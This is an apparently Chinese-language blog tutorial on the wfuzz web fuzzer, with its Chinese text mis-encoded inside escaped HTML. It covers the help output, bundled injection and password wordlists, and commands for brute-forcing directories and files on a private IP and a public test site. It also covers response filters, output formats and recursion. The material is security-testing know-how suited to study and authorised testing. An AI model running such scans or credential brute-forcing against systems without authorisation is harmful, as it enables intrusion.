  &lt;li&gt;&lt;a href=&quot;#å­—å…¸&quot; id=&quot;markdown-toc-å­—å…¸&quot;&gt;å­—å…¸&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#è½½è·payloads&quot; id=&quot;markdown-toc-è½½è·payloads&quot;&gt;è½½è·(payloads)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#è¾“å‡ºæ ¼å¼&quot; id=&quot;markdown-toc-è¾“å‡ºæ ¼å¼&quot;&gt;è¾“å‡ºæ ¼å¼&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#è¿‡æ»¤&quot; id=&quot;markdown-toc-è¿‡æ»¤&quot;&gt;è¿‡æ»¤&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#é€’å½’æµ‹è¯•&quot; id=&quot;markdown-toc-é€’å½’æµ‹è¯•&quot;&gt;é€’å½’æµ‹è¯•&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#å…¶ä»–&quot; id=&quot;markdown-toc-å…¶ä»–&quot;&gt;å…¶ä»–&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ğŸ¤º&lt;a href=&quot;https://wfuzz.readthedocs.io/en/latest/&quot;&gt;è¯¥é¡¹ç›®çš„å®˜ç½‘æ‰‹å†Œ&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ğŸ¤ºKali Linuxè‡ªå¸¦æ­¤å·¥å…·&lt;/p&gt;

&lt;p&gt;ğŸ¤ºåˆ°ç›®å‰ä¸ºæ­¢å¯¹è¿™ä¸ªå·¥å…·æœ€å¤§çš„æ„Ÿè§‰å°±æ˜¯ï¼Œç›®å½•çˆ†ç ´ï¼Œçˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ï¼Œä¹‹åä¼šå°è¯•å„ç§æ³¨å…¥ï¼Œè§ç¼æ’é’ˆ&lt;/p&gt;

&lt;p&gt;ğŸ¤ºå†…å¿ƒosï¼Œä»¥ä¸Šè¿™äº›éƒ½å¯¹å­—å…¸çš„ä¾èµ–æ¯”è¾ƒå¤§ï¼Œæ˜¯ä¸€ä¸ªéœ€è¦è‡ªå·±æƒ³åŠæ³•ç»´æŠ¤çš„å·¥å…·ï¼Œåœ¨æˆ‘èœé¸¡çš„æ‰‹é‡Œå’Œåˆ«äººçš„æ‰‹é‡Œå°±å¾ˆä¸ä¸€æ ·ï¼Œæ‰€ä»¥å°±æ˜¯ä¸ªäººç§¯ç´¯é—®é¢˜äº†ï¼Œé€šè¿‡ä¸ªäººçš„ç§¯ç´¯å’Œå¢åˆ ï¼Œè®©å·¥å…·æ›´é¡ºæ•é”&lt;/p&gt;

&lt;h1 id=&quot;è¯´æ˜ä¹¦&quot;&gt;è¯´æ˜ä¹¦&lt;/h1&gt;

&lt;p&gt;å®Œæ•´ç‰ˆhelpå¦‚ä¸‹&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --help
Â·Â·Â·
Options:
    -h/--help                 : This help
    --help                    : Advanced help
    --filter-help             : Filter language specification
    --version                 : Wfuzz version details
    -e &amp;lt;type&amp;gt;                 : List of available encoders/payloads/iterators/printers/scripts
    
    --recipe &amp;lt;filename&amp;gt;       : Reads options from a recipe. Repeat for various recipes.
    --dump-recipe &amp;lt;filename&amp;gt;  : Prints current options as a recipe
    --oF &amp;lt;filename&amp;gt;           : Saves fuzz results to a file. These can be consumed later using the wfuzz payload.
    
    -c                        : Output with colors
    -v                        : Verbose information.
    -f filename,printer       : Store results in the output file using the specified printer (raw printer if omitted).
    -o printer                : Show results using the specified printer.
    --interact                : (beta) If selected,all key presses are captured. This allows you to interact with the program.
    --dry-run                 : Print the results of applying the requests without actually making any HTTP request.
    --prev                    : Print the previous HTTP requests (only when using payloads generating fuzzresults)
    --efield &amp;lt;expr&amp;gt;           : Show the specified language expression together with the current payload
    --field &amp;lt;expr&amp;gt;            : Do not show the payload but only the specified language expression
    
    -p addr                   : Use Proxy in format ip:port:type. Repeat option for using various proxies.
                                Where type could be SOCKS4,SOCKS5 or HTTP if omitted.
    
    -t N                      : Specify the number of concurrent connections (10 default)
    -s N                      : Specify time delay between requests (0 default)
    -R depth                  : Recursive path discovery being depth the maximum recursion level.
    -L,--follow               : Follow HTTP redirections
    --ip host:port            : Specify an IP to connect to instead of the URL's host in the format ip:port
    -Z                        : Scan mode (Connection errors will be ignored).
    --req-delay N             : Sets the maximum time in seconds the request is allowed to take (CURLOPT_TIMEOUT). Default 90.
    --conn-delay N            : Sets the maximum time in seconds the connection phase to the server to take (CURLOPT_CONNECTTIMEOUT). Default 90.
    
    -A, --AA, --AAA           : Alias for --script=default,verbose,discovery -v -c
    --no-cache                : Disable plugins cache. Every request will be scanned.
    --script=                 : Equivalent to --script=default
    --script=&amp;lt;plugins&amp;gt;        : Runs script's scan. &amp;lt;plugins&amp;gt; is a comma separated list of plugin-files or plugin-categories
    --script-help=&amp;lt;plugins&amp;gt;   : Show help about scripts.
    --script-args n1=v1,...   : Provide arguments to scripts. ie. --script-args grep.regex=&quot;&amp;lt;A href=\&quot;(.*?)\&quot;&amp;gt;&quot;
    
    -u url                    : Specify a URL for the request.
    -m iterator               : Specify an iterator for combining payloads (product by default)
    -z payload                : Specify a payload for each FUZZ keyword used in the form of name[,parameter][,encoder].
                                A list of encoders can be used, ie. md5-sha1. Encoders can be chained, ie. md5@sha1.
                                Encoders category can be used. ie. url
                                Use help as a payload to show payload plugin's details (you can filter using --slice)
    --zP &amp;lt;params&amp;gt;             : Arguments for the specified payload (it must be preceded by -z or -w).
    --zD &amp;lt;default&amp;gt;            : Default parameter for the specified payload (it must be preceded by -z or -w).
    --zE &amp;lt;encoder&amp;gt;            : Encoder for the specified payload (it must be preceded by -z or -w).
    --slice &amp;lt;filter&amp;gt;          : Filter payload's elements using the specified expression. It must be preceded by -z.
    -w wordlist               : Specify a wordlist file (alias for -z file,wordlist).
    -V alltype                : All parameters bruteforcing (allvars and allpost). No need for FUZZ keyword.
    -X method                 : Specify an HTTP method for the request, ie. HEAD or FUZZ
    
    -b cookie                 : Specify a cookie for the requests. Repeat option for various cookies.
    -d postdata               : Use post data (ex: &quot;id=FUZZ&amp;amp;catalogue=1&quot;)
    -H header                 : Use header (ex:&quot;Cookie:id=1312321&amp;amp;user=FUZZ&quot;). Repeat option for various headers.
    --basic/ntlm/digest auth  : in format &quot;user:pass&quot; or &quot;FUZZ:FUZZ&quot; or &quot;domain\FUZ2Z:FUZZ&quot;
    
    --hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
    --sc/sl/sw/sh N[,N]+      : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
    --ss/hs regex             : Show/hide responses with the specified regex within the content
    --filter &amp;lt;filter&amp;gt;         : Show/hide responses using the specified filter expression (Use BBB for taking values from baseline)
    --prefilter &amp;lt;filter&amp;gt;      : Filter items before fuzzing using the specified expression.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶ä¸­æ¯”è¾ƒå…³æ³¨çš„å‚æ•°å¦‚ä¸‹&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;å‚æ•°&lt;/th&gt;
      &lt;th&gt;è¯´æ˜&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-e encoders/payloads/iterators/printers/scripts&lt;/td&gt;
      &lt;td&gt;ç½—åˆ—å¯ç”¨æ¨¡å—ï¼šåŠ å¯†/è½½è·/è¿­ä»£å™¨/æ‰“å°æ ¼å¼/è„šæœ¬&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-w&lt;/td&gt;
      &lt;td&gt;æŒ‡å®špayloadæ–‡ä»¶&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-z&lt;/td&gt;
      &lt;td&gt;æŒ‡å®špayloadæ–‡ä»¶&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“hc/hl/hw/hh&lt;/td&gt;
      &lt;td&gt;éšè—è¿‡æ»¤é¡¹&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“sc/sl/sw/sh&lt;/td&gt;
      &lt;td&gt;æ˜¾ç¤ºè¿‡æ»¤é¡¹&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“hs/ss&lt;/td&gt;
      &lt;td&gt;æ­£åˆ™è¿‡æ»¤&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-m&lt;/td&gt;
      &lt;td&gt;è¿­ä»£å™¨&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“script&lt;/td&gt;
      &lt;td&gt;ä½¿ç”¨è„šæœ¬&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;å­—å…¸&quot;&gt;å­—å…¸&lt;/h1&gt;

&lt;p&gt;Kaliè‡ªå¸¦æ­¤å·¥å…·ï¼Œå­—å…¸åœ¨ç›®å½•&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wfuzz/wordlist/&lt;/code&gt;ä¸‹&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;â”œâ”€â”€ Injections
â”‚   â”œâ”€â”€ All_attack.txt
â”‚   â”œâ”€â”€ SQL.txt
â”‚   â”œâ”€â”€ Traversal.txt
â”‚   â”œâ”€â”€ XML.txt
â”‚   â”œâ”€â”€ XSS.txt
â”‚   â””â”€â”€ bad_chars.txt
â”œâ”€â”€ general
â”‚   â”œâ”€â”€ admin-panels.txt
â”‚   â”œâ”€â”€ big.txt
â”‚   â”œâ”€â”€ catala.txt
â”‚   â”œâ”€â”€ common.txt
â”‚   â”œâ”€â”€ euskera.txt
â”‚   â”œâ”€â”€ extensions_common.txt
â”‚   â”œâ”€â”€ http_methods.txt
â”‚   â”œâ”€â”€ medium.txt
â”‚   â”œâ”€â”€ megabeast.txt
â”‚   â”œâ”€â”€ mutations_common.txt
â”‚   â”œâ”€â”€ spanish.txt
â”‚   â””â”€â”€ test.txt
â”œâ”€â”€ others
â”‚   â”œâ”€â”€ common_pass.txt
â”‚   â””â”€â”€ names.txt
â”œâ”€â”€ stress
â”‚   â”œâ”€â”€ alphanum_case.txt
â”‚   â”œâ”€â”€ alphanum_case_extra.txt
â”‚   â”œâ”€â”€ char.txt
â”‚   â”œâ”€â”€ doble_uri_hex.txt
â”‚   â”œâ”€â”€ test_ext.txt
â”‚   â””â”€â”€ uri_hex.txt
â”œâ”€â”€ vulns
â”‚   â”œâ”€â”€ apache.txt
â”‚   â”œâ”€â”€ cgis.txt
â”‚   â”œâ”€â”€ coldfusion.txt
â”‚   â”œâ”€â”€ dirTraversal-nix.txt
â”‚   â”œâ”€â”€ dirTraversal-win.txt
â”‚   â”œâ”€â”€ dirTraversal.txt
â”‚   â”œâ”€â”€ domino.txt
â”‚   â”œâ”€â”€ fatwire.txt
â”‚   â”œâ”€â”€ fatwire_pagenames.txt
â”‚   â”œâ”€â”€ frontpage.txt
â”‚   â”œâ”€â”€ iis.txt
â”‚   â”œâ”€â”€ iplanet.txt
â”‚   â”œâ”€â”€ jrun.txt
â”‚   â”œâ”€â”€ netware.txt
â”‚   â”œâ”€â”€ oracle9i.txt
â”‚   â”œâ”€â”€ sharepoint.txt
â”‚   â”œâ”€â”€ sql_inj.txt
â”‚   â”œâ”€â”€ sunas.txt
â”‚   â”œâ”€â”€ tests.txt
â”‚   â”œâ”€â”€ tomcat.txt
â”‚   â”œâ”€â”€ vignette.txt
â”‚   â”œâ”€â”€ weblogic.txt
â”‚   â””â”€â”€ websphere.txt
â””â”€â”€ webservices
    â”œâ”€â”€ ws-dirs.txt
    â””â”€â”€ ws-files.txt


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å½“ç„¶åªæ˜¯ä¸¾ä¸ªğŸŒ°ï¼Œç”¨è¿™é‡Œçš„å­—å…¸åŸºæœ¬ä¸ä¼šå¾—åˆ°ä»€ä¹ˆï¼Œè¿™é‡Œè´´ä¸€ä¸ªå¯»åˆ°çš„&lt;a href=&quot;https://github.com/TheKingOfDuck/fuzzDicts&quot;&gt;å­—å…¸é›†åˆ&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;è½½è·payloads&quot;&gt;è½½è·(payloads)&lt;/h1&gt;

&lt;p&gt;å“ˆå“ˆå“ˆå°±æ˜¯payloadï¼ŒæŸ¥çœ‹payloadæ¨¡å—&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e payloads

Available payloads:

  Name            | Summary                                                                           
------------------------------------------------------------------------------------------------------
  guitab          | This payload reads requests from a tab in the GUI                                 
  names           | Returns possible usernames by mixing the given words, separated by -, using know  
                  | n typical constructions.                                                          
  range           | Returns each number of the given range.                                           
  wfuzzp          | Returns fuzz results' URL from a previous stored wfuzz session.                   
  stdin           | Returns each item read from stdin.                                                
  hexrange        | Returns each hex number of the given hex range.                                   
  burplog         | Returns fuzz results from a Burp log.                                             
  hexrand         | Returns random hex numbers from the given range.                                  
  permutation     | Returns permutations of the given charset and length.                             
  file            | Returns each word from a file.                                                    
  burpstate       | Returns fuzz results from a Burp state.                                           
  dirwalk         | Returns filename's recursively from a local directory.                            
  iprange         | Returns list of IP addresses of a given IP range.                                 
  list            | Returns each element of the given word list separated by -.                       
  ipnet           | Returns list of IP addresses of a network.                                        
  autorize        | Returns fuzz results' from autorize.                                              
  buffer_overflow | Returns a string using the following pattern A * given number.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -z help&lt;/code&gt;å¯ä»¥è·å–å…³äºpayloadsç±»æ¨¡å—çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡&lt;code class=&quot;highlighter-rouge&quot;&gt;--slice&lt;/code&gt;å‚æ•°æ¥è¿‡æ»¤è¿”å›ä¿¡æ¯çš„ç»“æœã€‚&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z help --slice dirwalk

Name: dirwalk 0.1
Categories: default
Summary: Returns filename's recursively from a local directory.
Author: Xavi Mendez (@xmendez)
Description:
   Returns all the file paths found in the specified directory.
   Handy if you want to check a directory structure against a webserver,
   for example, because you have previously downloaded a specific version
   of what is supposed to be on-line.
Parameters:
   + dir: Directory path to walk and generate payload from.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä½¿ç”¨çš„å‘½ä»¤è¡ŒåŸºç¡€é•¿ç›¸å¦‚ä¸‹&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w wordlist url/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;wordlistæ˜¯å­—å…¸ï¼Œurlæ˜¯ç›®æ ‡é“¾æ¥ï¼ŒFUZZæ˜¯å ä½ç¬¦ï¼Œæ›¿æ¢payloadï¼Œå½¢å¦‚&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å ä½ç¬¦ä¹Ÿå¯ä»¥å¤šä¸ªï¼Œå³å¤šä¸ªpayloadï¼Œä¾‹å¦‚å¯ä»¥åŒæ—¶çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç 
ä½¿ç”¨&lt;code class=&quot;highlighter-rouge&quot;&gt;-z&lt;/code&gt; æˆ–&lt;code class=&quot;highlighter-rouge&quot;&gt;-w&lt;/code&gt;å‚æ•°å¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ªpayloadsï¼Œè¿™æ—¶ç›¸åº”çš„å ä½ç¬¦åº”è®¾ç½®ä¸º &lt;code class=&quot;highlighter-rouge&quot;&gt;FUZZ, â€¦ , FUZnZ,&lt;/code&gt;å…¶ä¸­nä»£è¡¨äº†payloadçš„åºå·ã€‚æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬åŒæ—¶æš´ç ´æ–‡ä»¶ï¼Œåç¼€å’Œç›®å½•ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt http://172.16.70.163/FUZZ/FUZ2ZFUZ3Z
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…³äº&lt;code class=&quot;highlighter-rouge&quot;&gt;-z&lt;/code&gt; æˆ–&lt;code class=&quot;highlighter-rouge&quot;&gt;-w&lt;/code&gt;æœ‰å•¥åŒºåˆ«ï¼š&lt;/p&gt;

&lt;p&gt;1ã€å¤šä¸ªpayloadæ—¶å€™æ²¡æœ‰åŒºåˆ«&lt;/p&gt;

&lt;p&gt;2ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;-w wordlist&lt;/code&gt;æ˜¯æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œç­‰æ•ˆäº&lt;code class=&quot;highlighter-rouge&quot;&gt;-z file,wordlist&lt;/code&gt;å’Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;-z file --zP fn=&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ä»¥ä¸‹ç­‰æ•ˆï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z file --zP fn=/usr/share/wfuzz/wordlist/general/common.txt http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;è¾“å‡ºæ ¼å¼&quot;&gt;è¾“å‡ºæ ¼å¼&lt;/h1&gt;

&lt;p&gt;æˆ‘ä»¬åœ¨ç»ˆç«¯è¿è¡Œä¼šåœ¨å‘½ä»¤è¡Œå¾—åˆ°ç»“æœ&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404,403 http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://testphp.vulnweb.com/FUZZ
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                                     
===================================================================

000000035:   301        7 L      12 W     184 Ch      &quot;admin&quot;                                     
000000229:   301        7 L      12 W     184 Ch      &quot;CVS&quot;                                       
000000412:   301        7 L      12 W     184 Ch      &quot;images&quot;                                    
000000721:   301        7 L      12 W     184 Ch      &quot;secured&quot;                                   

Total time: 27.57318
Processed Requests: 949
Filtered Requests: 945
Requests/sec.: 34.41750
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¹Ÿå¯ä»¥å°†ç»“æœè¾“å‡ºä¸ºæˆ‘ä»¬æŒ‡å®šçš„æ ¼å¼ï¼ŒæŸ¥çœ‹æ”¯æŒçš„è¾“å‡ºæ ¼å¼&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e printers

Available printers:

  Name      | Summary                             
--------------------------------------------------
  csv       | CSV printer ftw                     
  html      | Prints results in html format       
  json      | Results in json format              
  magictree | Prints results in magictree format  
  raw       | Raw output format
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æŒ‡å®šè¾“å‡ºç»“æœä¸ºhtml&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -f /tmp/outfile,html -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404,403 http://testphp.vulnweb.com/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200330_wfuzz0/output.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è¿™ä¸ªçœ‹ç€å¤ªé»‘å¯ä»¥æŠŠhtmlé‡Œçš„èƒŒæ™¯è‰²å’Œå­—ä½“é¢œè‰²æ¢ä¸€ä¸‹&lt;/p&gt;

&lt;h1 id=&quot;è¿‡æ»¤&quot;&gt;è¿‡æ»¤&lt;/h1&gt;

&lt;p&gt;ä»¥ä¸Šçš„å‘½ä»¤è¡Œä¸­&lt;code class=&quot;highlighter-rouge&quot;&gt;--hc&lt;/code&gt;å°±æ˜¯è¿‡æ»¤å™¨ï¼Œè¿‡æ»¤å™¨æœ‰&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;å‚æ•°&lt;/th&gt;
      &lt;th&gt;è¯´æ˜&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“hc&lt;/td&gt;
      &lt;td&gt;hide codeå°†æŒ‡å®šçš„ResponseçŠ¶æ€ç éšè—ï¼Œå¦‚â€“hc 404ï¼Œéšè—å“åº”ä¸º404&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“hl&lt;/td&gt;
      &lt;td&gt;hide lineså°†æŒ‡å®šçš„Linesæ•°éšè—&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“hw&lt;/td&gt;
      &lt;td&gt;hide wordå°†æŒ‡å®šçš„Wordæ•°éšè—&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“hh&lt;/td&gt;
      &lt;td&gt;hide charså°†æŒ‡å®šçš„Charsæ•°éšè—&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“sc&lt;/td&gt;
      &lt;td&gt;show codeå°†æŒ‡å®šçš„ResponseçŠ¶æ€ç æ˜¾ç¤ºï¼Œå¦‚â€“sc 200ï¼Œåªæ˜¾ç¤ºå“åº”ä¸º200&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“sl&lt;/td&gt;
      &lt;td&gt;show lineså°†æŒ‡å®šçš„Linesæ•°æ˜¾ç¤º&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“sw&lt;/td&gt;
      &lt;td&gt;show wordå°†æŒ‡å®šçš„Wordæ•°æ˜¾ç¤º&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“sh&lt;/td&gt;
      &lt;td&gt;show charså°†æŒ‡å®šçš„Charsæ•°æ˜¾ç¤º&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“hs&lt;/td&gt;
      &lt;td&gt;æ­£åˆ™éšè—&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€“ss&lt;/td&gt;
      &lt;td&gt;æ­£åˆ™æ˜¾ç¤º&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;Baseline(åŸºå‡†çº¿)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;è¿‡æ»¤å™¨å¯ä»¥æ˜¯æŸä¸ªHTTPå“åº”çš„å¼•ç”¨ï¼Œä¾‹å¦‚&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh BBB http://172.16.70.163/FUZZ{404there}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ„ä¸ºwfuzzç¬¬ä¸€ä¸ªè¯·æ±‚æ˜¯è¯·æ±‚&lt;code class=&quot;highlighter-rouge&quot;&gt;http://testphp.vulnweb.com/404there&lt;/code&gt;è¿™ä¸ªç½‘å€ï¼Œè¿™ä¸ªè¯·æ±‚è¢«æ ‡è®°ä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;BBB&lt;/code&gt;ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;BBB&lt;/code&gt;ä¹Ÿæ˜¯ä¸å¯ä»¥å˜çš„ï¼Œè¿™é‡Œç”¨åˆ°äº†&lt;code class=&quot;highlighter-rouge&quot;&gt;--hh&lt;/code&gt;ï¼Œå³ä»¥&lt;code class=&quot;highlighter-rouge&quot;&gt;BBB&lt;/code&gt;è¿™æ¡è¯·æ±‚è¿”å›çš„Charsä¸ºåŸºå‡†ï¼Œéšè—å…¶ä»–ä¸&lt;code class=&quot;highlighter-rouge&quot;&gt;BBB&lt;/code&gt;ç›¸åŒçš„è¿”å›&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--hs&lt;/code&gt;å’Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;--ss&lt;/code&gt;éƒ½å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥å¯¹è¿”å›ç»“æœè¿‡æ»¤ï¼Œä¾‹å¦‚&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hs &quot;Not Found&quot; http://172.16.70.163/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;é€’å½’æµ‹è¯•&quot;&gt;é€’å½’æµ‹è¯•&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-R&lt;/code&gt;å¯ç”¨äºæŒ‡å®šæœ‰æ•ˆè´Ÿè½½é€’å½’çš„æ·±åº¦ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¦æœç´¢ç°æœ‰ç›®å½•ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„æœ‰æ•ˆè´Ÿè½½å†æ¬¡åœ¨è¿™äº›ç›®å½•ä¸­è¿›è¡Œæ¨¡ç³Šæµ‹è¯•&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z list,&quot;admin/-Login-CVS-cgi-bin&quot;  -R 1 http://172.16.70.163/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
********************************************************
